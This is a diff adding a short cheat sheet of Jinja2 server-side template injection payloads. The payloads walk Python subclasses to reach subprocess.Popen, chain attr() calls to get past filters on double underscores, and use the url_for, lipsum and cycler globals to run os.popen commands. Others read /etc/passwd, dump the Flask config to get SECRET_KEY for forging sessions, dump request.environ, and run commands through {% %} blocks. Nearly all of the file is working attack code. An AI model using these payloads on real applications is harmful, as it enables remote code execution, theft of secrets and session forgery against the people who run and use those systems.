@@ -1,0 +1,20 @@
+# Jinja2 RCE / sensitive-read primitives. Iterate __subclasses__ to find Popen.
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ ''.__class__.__mro__[-1].__subclasses__() }}
+# Once you find the index N for subprocess.Popen:
+{{ ''.__class__.__mro__[1].__subclasses__()[N]('id', shell=True, stdout=-1).communicate() }}
+# Attribute-proxy bypass (when __ is blacklisted)
+{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}
+# url_for/lipsum/cycler globals route — usually unfiltered
+{{ url_for.__globals__.os.popen('id').read() }}
+{{ lipsum.__globals__.os.popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+# Read files directly
+{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
+# Dump Flask config (often contains SECRET_KEY → forge sessions)
+{{ config }}
+{{ config.items() }}
+# Server-side environment variables
+{{ request.environ }}
+# Unicode/format escapes when {{ }} is filtered but {% %} isn't
+{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}
